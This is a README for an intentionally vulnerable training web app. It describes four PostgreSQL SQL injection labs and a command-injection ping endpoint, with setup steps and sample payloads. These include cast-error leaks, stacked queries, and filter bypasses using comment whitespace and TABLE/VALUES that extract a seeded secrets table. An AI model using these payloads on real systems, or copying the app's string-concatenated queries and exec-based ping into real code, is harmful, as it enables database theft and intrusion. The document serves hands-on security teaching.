# example_postgresql_injection_webapp

An **intentionally vulnerable** demo web application that showcases
**error-based SQL injection** against PostgreSQL.

> Educational use only. Do not deploy on a public network.

## What it does

The app exposes two clearly separated tracks:

```sql
INSERT INTO records (username, email, comment)
VALUES ('<username>', '<email>', '<comment>')
RETURNING ...;
```

### SQL Injection track

All three SQL fields are concatenated directly into the query string
with no escaping or parameter binding, so every field is a SQL
injection sink.

- **Lab 1 — Error-based** (`POST /api/records`). The endpoint returns
  only the *last* result set from `pool.query`, so injection has to
  leak data through PostgreSQL error messages (cast errors, etc.).
- **Lab 2 — Stacked queries** (`POST /api/lab2/records`). Server splits
  the SQL on `;` and runs each statement separately. Errors from the
  original INSERT are sanitized to a generic message; only stacked
  statements leak via verbatim Postgres errors or via `resultSets`.
- **Lab 3 — Stacked queries + space filter** (`POST /api/lab3/records`).
  Same as Lab 2, but every literal space character is stripped from
  each field before concatenation. Payloads must use non-space
  whitespace tokens (`\t`, `\n`, `/**/`) to remain valid SQL.
- **Lab 4 — + SELECT/UNION filter** (`POST /api/lab4/records`). Same as
  Lab 3, plus the case-insensitive substrings `SELECT` and `UNION` are
  stripped from each field before concatenation. The classic
  `SELECT … FROM` and `UNION SELECT` patterns die. Bypass with PostgreSQL
  features that don't need those keywords: `TABLE foo` (alias for
  `SELECT * FROM foo`) and top-level `VALUES (...)`.

### Command Injection track

- **Command Injection Lab 1 — Space filter** (`POST /api/cmdi/lab1/ping`).
  A separate command-injection category. The server executes
  `ping -c 1 <target>` via `child_process.exec` after stripping only
  literal spaces from `target`. Non-space whitespace and shell
  metacharacters still pass, demonstrating why this filter is weak.

A "Verbose error responses" toggle at the top of the page controls
whether DB errors come back as the full Postgres JSON
(`error`/`detail`/`position`/`executedSql`) or just a generic 500 with
`ERROR: <message>`.

## Run it

With Docker:

```bash
docker compose up --build
```

Then open <http://localhost:3000>.

`docker-compose.yml` already wires `CMDI_SHELL` into the app service
with a default of `/bin/sh`:

```yaml
CMDI_SHELL: ${CMDI_SHELL:-/bin/sh}
```

So you can switch shell behavior directly at compose startup:

```bash
CMDI_SHELL=/bin/sh docker compose up --build
CMDI_SHELL=/bin/bash docker compose up --build
CMDI_SHELL=/bin/zsh docker compose up --build
```

You can also put `CMDI_SHELL=/bin/bash` (or another value) in a local
`.env` file and run `docker compose up --build`.

This repo now builds a custom app image (`Dockerfile`) that installs
`bash` and `zsh`, so `/bin/sh`, `/bin/bash`, and `/bin/zsh` all work
for `CMDI_SHELL` in Docker.

The server also normalizes shell paths if needed (for example, if
`/bin/zsh` is requested but only `/usr/bin/zsh` exists, it will use the
existing path automatically).

If you ever see `spawn /bin/bash ENOENT` (or zsh equivalent), the
configured shell path does not exist in the running container/host.
Rebuild the image with:

```bash
docker compose build --no-cache app
docker compose up
```

Without Docker (requires a local PostgreSQL):

```bash
createdb vulnerable_app
psql vulnerable_app -f db/init.sql
npm install
PGUSER=postgres PGPASSWORD=postgres PGDATABASE=vulnerable_app npm start
```

### Run with a specific command-execution shell (for Command Injection Lab)

The command-injection endpoint uses Node `exec`. You can force which
shell it uses via `CMDI_SHELL`:

```bash
CMDI_SHELL=/bin/sh npm start
CMDI_SHELL=/bin/bash npm start
CMDI_SHELL=/bin/zsh npm start
```

If `CMDI_SHELL` is not set, Node's system default shell is used
(`docker compose` defaults it to `/bin/sh` in this project).
The active shell is shown in the Command Injection lab UI and via:

```bash
curl http://localhost:3000/api/cmdi/settings
```

## Try the injection

### Lab 1 — Error-based payloads
- Break the syntax: value `'` → `unterminated quoted string ...`.
- Comment out the rest: `username = x', '', '') --` → INSERT closed.
- Cast-error data leak (`comment`):
  ```
  ') , ('x', 'y', (SELECT CAST(version() AS int))) --
  ```
  → `invalid input syntax for type integer: "PostgreSQL 16..."`.
- Leak the seeded flag (`comment`):
  ```
  ') , ('x', 'y', (SELECT CAST(value AS int) FROM secrets WHERE name='flag')) --
  ```

### Lab 2 — Stacked-query payloads
The server splits the constructed SQL on `;` and runs each statement
separately. Errors from the original INSERT (statement 0) are
collapsed to a generic `ERROR: syntax error` /
`ERROR: unterminated quoted string` — **error-based payloads inside
the INSERT body do not leak in Lab 2.** Errors from stacked statements
are returned verbatim.

- Stacked cast-error leak (any field): `'); SELECT CAST(version() AS int) --`
  → response `error`: `invalid input syntax for type integer: "PostgreSQL 16..."`.
- Stacked secrets cast-error leak (any field):
  `'); SELECT CAST((SELECT value FROM secrets WHERE name='flag') AS int) --`
- Stacked SELECT (no error needed): `'); SELECT name, value FROM secrets --`
  → leaked rows appear in `resultSets[1].rows`.
- In-INSERT cast (try this and observe it gets sanitized):
  `') , ('x','y',(SELECT CAST(version() AS int))) --`
  → response `error`: `ERROR: syntax error` (or `unterminated quoted string`),
  no leak.

The response body contains a `resultSets` array with one entry per
successfully executed statement, plus a `statementIndex` on errors so
you can tell which statement triggered the error.

### Lab 3 — Stacked queries + space filter
Same backend behaviour as Lab 2, but the server runs each field
through `s.replace(/ /g, '')` before concatenation. Spaces are gone;
other whitespace forms still pass. The response includes a
`filteredValues` object showing exactly what reached the SQL.

Lab 2 payloads with literal spaces no longer work in Lab 3. Rewrite
them with tabs, newlines, or block comments. Examples (use literal
TABs / newlines in the field, or `/**/` between tokens):

- Stacked cast-error leak (any field):
  `');SELECT/**/CAST(version()/**/AS/**/int)--`
- Stacked secrets cast-error leak:
  `');SELECT/**/CAST((SELECT/**/value/**/FROM/**/secrets/**/WHERE/**/name='flag')/**/AS/**/int)--`
- Stacked SELECT (no error needed):
  `');SELECT/**/name,value/**/FROM/**/secrets--`

Tip: in the browser form you can also paste real tab/newline characters
between SQL keywords; both survive the filter and are valid Postgres
whitespace.

### Lab 4 — Stacked + space + SELECT/UNION filter
Builds on Lab 3 by additionally stripping the case-insensitive
substrings `SELECT` and `UNION` from each field before concatenation.
Lab 3 payloads above all reference `SELECT` and stop working. Use
PostgreSQL constructs that don't need either keyword:

- Read all secrets via `TABLE` shorthand:
  `');TABLE/**/secrets--`
  → leaked rows appear in `resultSets[1].rows`.
- Cast-error leak via top-level `VALUES`:
  `');VALUES(CAST(version()AS/**/int))--`
  → response `error`: `invalid input syntax for type integer: "PostgreSQL 16..."`.
- Cast-error leak of the seeded flag (no `SELECT`, all-rows fallback):
  `');VALUES(CAST((TABLE/**/secrets)AS/**/int))--`
  (subquery returns multiple columns/rows; the resulting Postgres error
  message still surfaces context useful for further exfiltration.)

The `filteredValues` echo in the response (when verbose is on) is
useful here for confirming what the server actually concatenated after
both filter passes.

## Files

- `server.js` — Express backend. SQL Injection endpoints: `POST /api/records` (Lab 1), `POST /api/lab2/records` (Lab 2), `POST /api/lab3/records` (Lab 3), `POST /api/lab4/records` (Lab 4). Command Injection endpoint: `POST /api/cmdi/lab1/ping`. Settings: `GET/POST /api/settings` (SQL labs) and `GET /api/cmdi/settings` (active command-injection shell).
- `public/index.html` — Frontend with separate category tabs for SQL Injection labs and Command Injection labs, plus the verbose-errors toggle.
- `db/init.sql` — Schema + a `secrets` table to make exfiltration demos meaningful.
- `docker-compose.yml` — Postgres 16 + Node 20 dev stack.
- `Dockerfile` — App image used by compose; installs `bash`/`zsh` for CMDI shell switching tests.
